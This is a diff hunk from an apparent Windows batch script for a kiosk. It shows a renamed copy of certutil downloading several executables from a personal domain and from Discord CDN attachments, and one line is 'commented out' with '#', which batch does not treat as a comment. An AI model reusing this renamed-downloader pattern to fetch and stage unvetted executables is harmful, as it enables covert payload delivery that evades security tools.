@@ -34,7 +34,7 @@ echo Exists) ELSE (
 "c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\rdl.exe"
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\VoughtUadml.exe"
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105542124436459550/nt.exe" "C:\Users\kiosk\Downloads\nt.exe"
-"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105963087632273599/task.exe" "C:\Users\kiosk\Downloads\task.exe"
+#"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105963087632273599/task.exe" "C:\Users\kiosk\Downloads\task.exe"
 
 if not exist "%unzipFolder%" (
   md "%unzipFolder%"
